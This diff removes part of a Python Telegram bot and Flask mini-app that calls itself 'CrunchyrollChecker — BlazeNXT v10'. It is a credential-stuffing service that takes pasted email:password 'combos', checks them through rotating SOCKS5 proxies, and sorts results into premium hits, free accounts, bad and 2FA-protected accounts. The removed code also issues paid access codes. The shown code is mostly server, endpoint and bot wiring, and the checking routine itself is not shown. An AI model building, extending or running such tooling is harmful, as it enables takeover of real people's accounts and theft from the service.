-                alphabet = string.ascii_letters + string.digits
-                code = "BLAZE-" + "".join(secrets.choice(alphabet) for _ in range(12)).upper()
-                # store in STORE.codes if exists
-                exp = int(_t.time()) + hours*3600
-                expiry = _t.strftime("%Y-%m-%d %H:%M UTC", _t.gmtime(exp))
-                if hasattr(STORE, "codes"):
-                    STORE.codes[code] = {"hours": hours, "exp": exp, "used": False}
-                    STORE.save() if hasattr(STORE, "save") else None
-        except Exception as e:
-            return jsonify({"ok": False, "error": str(e)}), 500
-        return jsonify({"ok": True, "code": code, "expiry": expiry, "hours": hours})
-
-    @app.post("/api/check")
-    def _api_check():
-        import time as _t
-        try:
-            body = request.get_json(force=True) or {}
-            text = body.get("text") or body.get("combo") or body.get("combos") or ""
-            premium_only = bool(body.get("premium_only") or body.get("premiumOnly"))
-        except Exception:
-            return jsonify({"ok": False, "error": "invalid json"}), 400
-        if not text or not text.strip():
-            return jsonify({"ok": False, "error": "no combos"}), 400
-        # Use the single source of truth: run_check(text) — it handles extract + threading + proxy rotation
-        try:
-            # Limit bulk for same-service Railway (protect OOM)
-            creds_preview = extract_credentials(text) if "extract_credentials" in globals() else []
-            MAX = 500
-            if len(creds_preview) > MAX:
-                # Truncate text to first MAX lines that contain a match — simpler: just trim
-                lines = text.splitlines()
-                keep = []
-                for ln in lines:
-                    if len(keep) >= MAX:
-                        break
-                    if ln.strip():
-                        keep.append(ln)
-                text = "\n".join(keep)
-            t0 = _t.time()
-            res = run_check(text) if "run_check" in globals() else {"hits":[],"free":[],"bad":0,"err":0,"twofa":0,"rate":0,"live_feed":[],"total":0,"processed":0}
-            elapsed = _t.time() - t0
-            # run_check already gives seconds/cpm/elapsed; ensure fields
-            total = res.get("total", 0)
-            hits = res.get("hits") or []
-            free = res.get("free") or []
-            # premium_only filter: only keep hits that are Premium
-            if premium_only:
-                hits = [h for h in hits if (h.get("data",{}).get("plan") or "").strip()]
-                # hits already are premium; free stays but API will hide? Keep as is
-                free = []  # when premium_only, hide free
-            # Normalize hits for front-end: ensure cred.value/password present
-            proxies = proxy_count() if "proxy_count" in globals() else 0
-            # Build UI-friendly response — keep run_check shape plus computed fields
-            rate_str = f"{(len(hits)/total*100):.1f}%" if total else "0%"
-            cpm_val = res.get("cpm", 0)
-            # Ensure cpm is int
-            try:
-                cpm_val = int(cpm_val) if isinstance(cpm_val, (int,float)) else 0
-            except Exception:
-                cpm_val = 0
-            return jsonify({
-                "ok": True,
-                "total": total,
-                "processed": res.get("processed", total),
-                "hits": hits,
-                "free": free,
-                "bad": res.get("bad", 0),
-                "err": res.get("err", 0),
-                "twofa": res.get("twofa", 0),
-                "rate": res.get("rate", 0) if not premium_only else rate_str,
-                "cpm": cpm_val,
-                "seconds": res.get("seconds", round(elapsed,1)),
-                "elapsed": res.get("elapsed", elapsed),
-                "eta": "—",
-                "proxies": proxies,
-                "live_feed": res.get("live_feed", [])[-5:],
-                "premium_only": premium_only,
-            })
-        except Exception as e:
-            import traceback
-            traceback.print_exc()
-            return jsonify({"ok": False, "error": str(e)}), 500
-
-    # catch-all for /assets etc -> static
-    @app.get("/<path:path>")
-    def _static(path):
-        try:
-            return send_from_directory(str(MINI_APP_PATH), path)
-        except Exception:
-            return "not found", 404
-
-    _miniapp_app = app
-    return app
-
-def start_miniapp_server():
-    global _miniapp_started
-    if _miniapp_started:
-        return
-    if not FLASK_OK:
-        print("[miniapp] Flask not available — miniapp disabled (pip install Flask flask-cors)")
-        return
-    if not MINI_APP_PATH.exists():
-        print(f"[miniapp] folder not found: {MINI_APP_PATH}")
-        return
-    try:
-        app = _build_flask_app()
-        if app is None:
-            return
-        import threading
-        def _run():
-            try:
-                print(f"[miniapp] serving {MINI_APP_PATH} on 0.0.0.0:{PORT}  url={_get_miniapp_url() or '(no MINI_APP_URL)'}")
-                app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False, threaded=True)
-            except Exception as e:
-                print(f"[miniapp] server error: {e}")
-        th = threading.Thread(target=_run, daemon=True, name="miniapp")
-        th.start()
-        _miniapp_started = True
-    except Exception as e:
-        print(f"[miniapp] start failed: {e}")
-
-async def _post_init_set_menu(app):
-    """PTB post_init hook — runs inside the bot's event loop after initialize."""
-    url = _get_miniapp_url()
-    if not url:
-        print("[miniapp] MINI_APP_URL not set — menu webapp skipped (set MINI_APP_URL or RAILWAY_PUBLIC_DOMAIN)")
-        return
-    try:
-        from telegram import MenuButtonWebApp, WebAppInfo
-        await app.bot.set_chat_menu_button(menu_button=MenuButtonWebApp(text="BlazeNXT", web_app=WebAppInfo(url=url)))
-        print(f"[miniapp] menu button set: {url}")
-    except Exception as e:
-        print(f"[miniapp] set_chat_menu_button failed: {e}")
-
-def setup_miniapp_menu(app):
-    # Legacy wrapper — now handled via post_init; kept for compatibility
-    # If called before run_polling (old path), schedule via post_init instead of asyncio.run
-    print("[miniapp] setup_miniapp_menu is now handled via post_init — url:", _get_miniapp_url() or "not set")
-
-
-# ── Premium wrappers for text generators ──
-# Ensure every user-visible message uses <tg-emoji> premium tags
-try:
-    _orig_welcome_premium_text = welcome_premium_text
-    def welcome_premium_text(uid, name):
-        return _premium_wrap(_orig_welcome_premium_text(uid, name))
-except Exception: pass
-
-try:
-    _orig_help_text = help_text
-    def help_text():
-        return _premium_wrap(_orig_help_text())
-except Exception: pass
-
-try:
-    _orig_status_text = status_text
-    def status_text():
-        return _premium_wrap(_orig_status_text())
-except Exception: pass
-
-try:
-    _orig_hit_card = hit_card
-    def hit_card(entry):
-        return _premium_wrap(_orig_hit_card(entry))
-except Exception: pass
-
-try:
-    _orig_summary_text = summary_text
-    def summary_text(results):
-        return _premium_wrap(_orig_summary_text(results))
-except Exception: pass
-
-try:
-    _orig_progress_text = progress_text
-    def progress_text(results):
-        return _premium_wrap(_orig_progress_text(results))
-except Exception: pass
-
-try:
-    _orig_oxaam_report = _oxaam_report
-    def _oxaam_report(email, pw, res):
-        return _premium_wrap(_orig_oxaam_report(email, pw, res))
-except Exception: pass
-
-# Also wrap generic send functions that may bypass _send_menu
-try:
-    _orig_send_hit_cards = send_hit_cards
-    async def send_hit_cards(msg, entries, cap=8):
-        # entries already premium via hit_card, but ensure
-        return await _orig_send_hit_cards(msg, entries, cap)
-except Exception: pass
-
-def main():
-    # Start Flask FIRST so Railway health check passes even if token is bad
-    try:
-        print(f"[miniapp] pre-start Flask on 0.0.0.0:{PORT} ...")
-        start_miniapp_server()
-    except Exception as _e:
-        print(f"[miniapp] pre-start failed: {_e}")
-
-    if not BOT_TOKEN or ":" not in BOT_TOKEN:
-        print("[!] BOT_TOKEN is not set.  Export BOT_TOKEN=<token from @BotFather>")
-        print(f"[!] Flask health endpoint stays up on :{PORT} (/health) — fix BOT_TOKEN and redeploy")
-        # Keep process alive for health check + logs
-        import time as _time
-        while True:
-            _time.sleep(3600)
-    if not OWNER_ID:
-        print("[!] OWNER_ID is not set (or not a number).  Export OWNER_ID=<your Telegram numeric id>")
-        sys.exit(1)
-
-    global STORE
-    STORE = Store(DATA_DIR / "store.json")
-
-    print(f"[*] CrunchyrollChecker — BlazeNXT v10 starting")
-    print(f"[*] Owner: {OWNER_USERNAME} ({OWNER_ID}) | Admins: IDs={len(ADMIN_IDS)} Usernames={len(ADMIN_USERNAMES)}")
-    if ADMIN_IDS - {OWNER_ID}:
-        print(f"[*] Extra Admin IDs: {sorted(ADMIN_IDS - {OWNER_ID})}")
-    if ADMIN_USERNAMES:
-        print(f"[*] Admin Usernames: {sorted(ADMIN_USERNAMES)}")
-    print(f"[*] Threads: {THREADS} | SOCKS5: {SOCKS5_OK} | Data dir: {DATA_DIR.resolve()}")
-
-    _load_pool_into_live()
-    threading.Thread(target=_proxy_loop, daemon=True).start()
-
-    # Build with post_init to set WebApp menu inside event loop (avoids asyncio.run event-loop-closed bug)
-    app = Application.builder().token(BOT_TOKEN).concurrent_updates(True).post_init(_post_init_set_menu).build()
-    app.add_handler(CommandHandler("start", cmd_start))
-    app.add_handler(MessageHandler(filters.COMMAND, cmd_any))  # any other /cmd -> buttons
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-    app.add_handler(CallbackQueryHandler(on_button))
-    app.add_error_handler(on_error)
-
-    print("[+] Bot running. Ctrl+C to stop.")
-    # PTB handles retries for getMe; log token prefix for debug (masked)
-    print(f"[*] Token: {BOT_TOKEN[:6]}...{BOT_TOKEN[-4:]} len={len(BOT_TOKEN)} | Polling...")
-    # Keep Flask alive even if polling crashes — Railway health check needs /health
-    import time as _time
-    while True:
-        try:
-            app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
-            break  # clean exit
-        except Exception as e:
-            # Log and retry after 5s — prevents crash-loop from killing Flask health endpoint
-            print(f"[!] Polling crashed: {e} — retry in 5s (Flask stays up on :{PORT})")
-            import traceback as _tb
-            _tb.print_exc()
-            _time.sleep(5)
-            # Ensure Flask still running
-            try:
-                start_miniapp_server()
-            except Exception:
-                pass
-
 
 if __name__ == "__main__":
     main()
